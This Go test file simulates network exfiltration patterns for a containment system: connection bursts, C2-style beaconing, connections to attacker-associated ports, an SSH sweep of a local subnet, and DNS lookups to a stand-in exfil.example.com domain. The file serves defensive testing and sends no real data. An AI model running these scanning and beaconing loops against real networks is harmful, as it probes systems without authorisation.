// Adversarial simulation: Network data exfiltration
//
// Tests detection of data exfiltration patterns:
//   - Rapid outbound connections to multiple IPs
//   - Large data transfers
//   - Beaconing (periodic C2 communication)
//   - DNS tunneling
//
// Expected behavior:
//   - High socket_connect rate triggers anomaly
//   - Process escalated to ISOLATED (network blocked)
//   - Connection attempts fail after containment

package adversarial

import (
	"fmt"
	"net"
	"testing"
	"time"
)

func TestExfiltration_RapidOutboundConnections(t *testing.T) {
	// Simulate malware connecting to multiple C2 servers
	targets := []string{
		"1.1.1.1:443",
		"8.8.8.8:443",
		"9.9.9.9:443",
		"208.67.222.222:443",
		"1.0.0.1:443",
	}

	startTime := time.Now()
	successCount := 0

	for i := 0; i < 100; i++ {
		target := targets[i%len(targets)]
		
		conn, err := net.DialTimeout("tcp", target, 2*time.Second)
		if err == nil {
			conn.Close()
			successCount++
		} else {
			t.Logf("Connection to %s failed after %d attempts: %v", 
				target, i, err)
			break
		}

		time.Sleep(50 * time.Millisecond)
	}

	elapsed := time.Since(startTime)

	t.Logf("Rapid outbound connections:")
	t.Logf("  Successful: %d / 100", successCount)
	t.Logf("  Time to containment: %.2fs", elapsed.Seconds())
	t.Logf("  Connection rate: %.1f/sec", float64(successCount)/elapsed.Seconds())

	if successCount >= 100 {
		t.Logf("WARNING: No containment detected")
	} else {
		t.Logf("SUCCESS: Containment triggered after %d connections", successCount)
	}
}

func TestExfiltration_Beaconing(t *testing.T) {
	// Simulate C2 beaconing (periodic connections to same host)
	target := "1.1.1.1:443"
	
	beaconCount := 0
	startTime := time.Now()

	for i := 0; i < 50; i++ {
		conn, err := net.DialTimeout("tcp", target, 1*time.Second)
		if err != nil {
			t.Logf("Beacon blocked at attempt %d after %.2fs", 
				i, time.Since(startTime).Seconds())
			break
		}
		
		conn.Close()
		beaconCount++

		// Beacon interval: 5 seconds (typical C2 pattern)
		time.Sleep(5 * time.Second)
	}

	t.Logf("Beaconing simulation:")
	t.Logf("  Beacons sent: %d", beaconCount)
	t.Logf("  Duration: %.2fs", time.Since(startTime).Seconds())

	// OCTOREFLEX should detect the pattern even with longer intervals
	if beaconCount >= 50 {
		t.Log("WARNING: Beaconing not detected")
	}
}

func TestExfiltration_UnusualPorts(t *testing.T) {
	// Connect to uncommon ports (suspicious behavior)
	unusualPorts := []int{31337, 4444, 8888, 6667, 1337}
	
	successCount := 0
	startTime := time.Now()

	for _, port := range unusualPorts {
		target := fmt.Sprintf("1.1.1.1:%d", port)
		
		conn, err := net.DialTimeout("tcp", target, 1*time.Second)
		if err == nil {
			conn.Close()
			successCount++
		} else {
			t.Logf("Connection to port %d blocked", port)
		}

		time.Sleep(100 * time.Millisecond)
	}

	elapsed := time.Since(startTime)

	t.Logf("Unusual ports test:")
	t.Logf("  Connections attempted: %d", len(unusualPorts))
	t.Logf("  Successful: %d", successCount)
	t.Logf("  Time: %.2fs", elapsed.Seconds())
}

func TestExfiltration_MultipleIPsSequential(t *testing.T) {
	// Lateral movement pattern: connect to many IPs sequentially
	baseIP := "192.168.1."
	
	connectCount := 0
	startTime := time.Now()

	for i := 1; i <= 254; i++ {
		target := fmt.Sprintf("%s%d:22", baseIP, i)
		
		conn, err := net.DialTimeout("tcp", target, 100*time.Millisecond)
		if err == nil {
			conn.Close()
			connectCount++
		}

		// Fast scanning
		time.Sleep(10 * time.Millisecond)

		// Check if we've been contained
		if i > 10 && connectCount == 0 {
			t.Logf("No successful connections - may be contained")
			break
		}
	}

	elapsed := time.Since(startTime)

	t.Logf("Sequential IP scanning:")
	t.Logf("  Connections attempted: 254")
	t.Logf("  Successful: %d", connectCount)
	t.Logf("  Scan rate: %.1f IPs/sec", 254.0/elapsed.Seconds())
	
	// High connection rate should trigger anomaly
	if connectCount > 50 {
		t.Log("WARNING: Extensive scanning not contained")
	}
}

func TestExfiltration_DNSTunneling(t *testing.T) {
	// Simulate DNS tunneling (rapid DNS queries with encoded data)
	resolver := &net.Resolver{
		PreferGo: true,
	}

	queryCount := 0
	startTime := time.Now()

	for i := 0; i < 100; i++ {
		// DNS query with encoded data in subdomain
		domain := fmt.Sprintf("data-%x.exfil.example.com", i)
		
		_, err := resolver.LookupHost(nil, domain)
		// Expect NXDOMAIN, but the query itself is suspicious
		if err != nil {
			queryCount++
		}

		time.Sleep(100 * time.Millisecond)

		// In production, high DNS query rate would be detected
	}

	elapsed := time.Since(startTime)

	t.Logf("DNS tunneling simulation:")
	t.Logf("  Queries sent: %d", queryCount)
	t.Logf("  Duration: %.2fs", elapsed.Seconds())
	t.Logf("  Query rate: %.1f/sec", float64(queryCount)/elapsed.Seconds())
	t.Log("Note: DNS anomaly detection requires DNS monitoring extension")
}

func BenchmarkConnectionRate(b *testing.B) {
	// Measure baseline connection rate
	target := "1.1.1.1:443"
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		conn, err := net.DialTimeout("tcp", target, 2*time.Second)
		if err == nil {
			conn.Close()
		}
	}
}
